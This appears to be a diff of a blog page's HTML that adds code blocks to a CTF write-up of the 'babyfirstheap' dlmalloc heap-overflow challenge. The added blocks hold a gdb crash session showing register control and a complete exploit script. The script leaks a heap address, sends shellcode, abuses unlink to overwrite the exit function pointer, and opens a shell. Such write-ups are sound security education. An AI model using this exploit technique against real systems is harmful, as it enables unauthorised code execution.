@@ -116,11 +116,197 @@
 
 <p>when open binary to hex-rays, i could see that successive free. it is very vulnerable So i debuged binary, then i faced segment fault</p>
 
-<p>File /home/pwn/Desktop/octopress/source/codeview/debug could not be found</p>
+<figure class='code'><figcaption><span>[crash the binary] (debug)</span> <a href='/codeview/debug'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">python</span><span class="w"> </span><span class="o">-</span><span class="vg">c</span><span class="w"> </span><span class="c1">&#39;print &quot;BBBB&quot;+&quot;CCCC&quot;+&quot;A&quot;*252&#39;&gt;&gt;poc</span>
+</span><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">gdb</span><span class="w"> </span><span class="o">-</span><span class="vg">q</span><span class="w"> </span><span class="o">./</span><span class="vg">babyfirstheap</span>
+</span><span class='line'><span class="vg">Reading</span><span class="w"> </span><span class="vg">symbols</span><span class="w"> </span><span class="vg">from</span><span class="w"> </span><span class="o">./</span><span class="vg">babyfirstheap</span><span class="o">...</span><span class="vg">done</span><span class="o">.</span>
+</span><span class='line'><span class="p">(</span><span class="vg">gdb</span><span class="p">)</span><span class="w"> </span><span class="vg">r</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="vg">poc</span>
+</span><span class='line'><span class="vg">Starting</span><span class="w"> </span><span class="nl">program:</span><span class="w"> </span><span class="o">/</span><span class="vg">home</span><span class="o">/</span><span class="vg">pwn</span><span class="o">/</span><span class="vg">babyfirstheap</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="vg">poc</span>
+</span><span class='line'>
+</span><span class='line'><span class="vg">Welcome</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">your</span><span class="w"> </span><span class="vg">first</span><span class="w"> </span><span class="vg">heap</span><span class="w"> </span><span class="vg">overflow</span><span class="o">...</span>
+</span><span class='line'><span class="vg">I</span><span class="w"> </span><span class="vg">am</span><span class="w"> </span><span class="vg">going</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">allocate</span><span class="w"> </span><span class="il">20</span><span class="w"> </span><span class="vg">objects</span><span class="o">...</span>
+</span><span class='line'><span class="vg">Using</span><span class="w"> </span><span class="vg">Dougle</span><span class="w"> </span><span class="vg">Lee</span><span class="w"> </span><span class="vg">Allocator</span><span class="w"> </span><span class="mf">2.6.1</span><span class="o">...</span>
+</span><span class='line'><span class="vg">Goodluck!</span>
+</span><span class='line'>
+</span><span class='line'><span class="vg">Exit</span><span class="w"> </span><span class="vg">function</span><span class="w"> </span><span class="vg">pointer</span><span class="w"> </span><span class="vg">is</span><span class="w"> </span><span class="vg">at</span><span class="w"> </span><span class="il">804</span><span class="vg">C8AC</span><span class="w"> </span><span class="vg">address</span><span class="o">.</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2008</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1246</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC24F0</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1121</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2958</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">947</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2D10</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">741</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3000</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">706</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC32C8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">819</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3600</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">673</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC38A8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1004</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3C98</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">952</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4058</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">755</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4350</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">260</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4458</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">877</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC47D0</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1245</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4CB8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1047</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC50D8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1152</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC5560</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1047</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC5980</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">1059</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC5DA8</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">906</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC6138</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">879</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">ALLOC</span><span class="p">][</span><span class="vg">loc</span><span class="o">=</span><span class="il">8</span><span class="vg">EC64B0</span><span class="p">][</span><span class="vg">size</span><span class="o">=</span><span class="il">823</span><span class="p">]</span>
+</span><span class='line'><span class="vg">Write</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">object</span><span class="w"> </span><span class="p">[</span><span class="vg">size</span><span class="o">=</span><span class="il">260</span><span class="p">]</span><span class="o">:</span>
+</span><span class='line'><span class="vg">Copied</span><span class="w"> </span><span class="il">261</span><span class="w"> </span><span class="vg">bytes</span><span class="o">.</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2008</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC24F0</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2958</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC2D10</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3000</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC32C8</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3600</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC38A8</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC3C98</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="vg">FREE</span><span class="p">][</span><span class="vg">address</span><span class="o">=</span><span class="il">8</span><span class="vg">EC4058</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="vg">Program</span><span class="w"> </span><span class="vg">received</span><span class="w"> </span><span class="vg">signal</span><span class="w"> </span><span class="vg">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="vg">Segmentation</span><span class="w"> </span><span class="vg">fault</span><span class="o">.</span>
+</span><span class='line'><span class="nl">0</span><span class="vg">x080493f6</span><span class="w"> </span><span class="vg">in</span><span class="w"> </span><span class="vg">free</span><span class="w"> </span><span class="p">(</span><span class="vg">mem</span><span class="o">=</span><span class="il">0</span><span class="vg">x8ec4058</span><span class="p">)</span><span class="w"> </span><span class="vg">at</span><span class="w"> </span><span class="vg">malloc</span><span class="o">.</span><span class="nl">c:</span><span class="il">1259</span>
+</span><span class='line'><span class="nl">1259</span><span class="w">  </span><span class="vg">malloc</span><span class="o">.</span><span class="nl">c:</span><span class="w"> </span><span class="err">그런</span><span class="w"> </span><span class="err">파일이나</span><span class="w"> </span><span class="err">디렉터리가</span><span class="w"> </span><span class="err">없습니다</span><span class="o">.</span>
+</span><span class='line'><span class="p">(</span><span class="vg">gdb</span><span class="p">)</span><span class="w"> </span><span class="vg">i</span><span class="w"> </span><span class="vg">r</span>
+</span><span class='line'><span class="vg">eax</span><span class="w">            </span><span class="il">0</span><span class="vg">x42424242</span><span class="w">  </span><span class="il">1111638594</span>
+</span><span class='line'><span class="vg">ecx</span><span class="w">            </span><span class="il">0</span><span class="vg">x8ec2004</span><span class="w">   </span><span class="il">149692420</span>
+</span><span class='line'><span class="vg">edx</span><span class="w">            </span><span class="il">0</span><span class="vg">x43434343</span><span class="w">  </span><span class="il">1128481603</span>
+</span><span class='line'><span class="vg">ebx</span><span class="w">            </span><span class="il">0</span><span class="vg">xf76d7000</span><span class="w">  </span><span class="il">-143822848</span>
+</span><span class='line'><span class="vg">esp</span><span class="w">            </span><span class="il">0</span><span class="vg">xffac4580</span><span class="w">  </span><span class="il">0</span><span class="vg">xffac4580</span>
+</span><span class='line'><span class="vg">ebp</span><span class="w">            </span><span class="il">0</span><span class="vg">xffac45b8</span><span class="w">  </span><span class="il">0</span><span class="vg">xffac45b8</span>
+</span><span class='line'><span class="vg">esi</span><span class="w">            </span><span class="il">0</span><span class="vg">x0</span><span class="w"> </span><span class="il">0</span>
+</span><span class='line'><span class="vg">edi</span><span class="w">            </span><span class="il">0</span><span class="vg">x0</span><span class="w"> </span><span class="il">0</span>
+</span><span class='line'><span class="vg">eip</span><span class="w">            </span><span class="il">0</span><span class="vg">x80493f6</span><span class="w">   </span><span class="il">0</span><span class="vg">x80493f6</span><span class="w"> </span><span class="o">&lt;</span><span class="vg">free</span><span class="o">+</span><span class="il">273</span><span class="o">&gt;</span>
+</span><span class='line'><span class="vg">eflags</span><span class="w">         </span><span class="il">0</span><span class="vg">x10216</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="vg">PF</span><span class="w"> </span><span class="vg">AF</span><span class="w"> </span><span class="kr">IF</span><span class="w"> </span><span class="vg">RF</span><span class="w"> </span><span class="p">]</span>
+</span><span class='line'><span class="vg">cs</span><span class="w">             </span><span class="il">0</span><span class="vg">x23</span><span class="w">    </span><span class="il">35</span>
+</span><span class='line'><span class="vg">ss</span><span class="w">             </span><span class="il">0</span><span class="vg">x2b</span><span class="w">    </span><span class="il">43</span>
+</span><span class='line'><span class="vg">ds</span><span class="w">             </span><span class="il">0</span><span class="vg">x2b</span><span class="w">    </span><span class="il">43</span>
+</span><span class='line'><span class="vg">es</span><span class="w">             </span><span class="il">0</span><span class="vg">x2b</span><span class="w">    </span><span class="il">43</span>
+</span><span class='line'><span class="vg">fs</span><span class="w">             </span><span class="il">0</span><span class="vg">x0</span><span class="w"> </span><span class="il">0</span>
+</span><span class='line'><span class="vg">gs</span><span class="w">             </span><span class="il">0</span><span class="vg">x63</span><span class="w">    </span><span class="il">99</span>
+</span><span class='line'><span class="p">(</span><span class="vg">gdb</span><span class="p">)</span><span class="w"> </span><span class="vg">x</span><span class="o">/</span><span class="vg">i</span><span class="w"> </span><span class="err">$</span><span class="vg">pc</span>
+</span><span class='line'><span class="o">=&gt;</span><span class="w"> </span><span class="il">0</span><span class="vg">x80493f6</span><span class="w"> </span><span class="o">&lt;</span><span class="vg">free</span><span class="o">+</span><span class="il">273</span><span class="o">&gt;:</span><span class="w">   </span><span class="vg">mov</span><span class="w">    </span><span class="o">%</span><span class="vg">edx</span><span class="p">,</span><span class="il">0</span><span class="vg">x8</span><span class="p">(</span><span class="o">%</span><span class="vg">eax</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>i hereby control got overwrite.(specific technic about this vuln that reference<a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf">https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf</a></p>
 
-<p>File /home/pwn/Desktop/octopress/source/codeview/babyfirstheap.py could not be found</p>
+<figure class='code'><figcaption><span>[Baby's first heap] (babyfirstheap.py)</span> <a href='/codeview/babyfirstheap.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'><span class="n">a</span> <span class="o">=</span> <span class="mf">0.3</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">MakeCon</span><span class="p">():</span>
+</span><span class='line'>  <span class="n">MakeCon</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;192.168.224.152&quot;</span><span class="p">,</span><span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">MakeCon</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">MakeCon</span><span class="p">()</span>
+</span><span class='line'><span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;[size=260]&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">18</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">]</span>
+</span><span class='line'><span class="n">hex_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="n">leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">hex_addr</span>
+</span><span class='line'><span class="n">exit_func</span> <span class="o">=</span> <span class="mh">0x804c8ac</span>
+</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xeb\x0c</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">nopsled</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">shellcode</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">260</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">dat</span><span class="p">))</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x01\x00\x00\x00</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">exit_func</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">hex_addr</span><span class="p">)</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
 </div>
 
 </article>
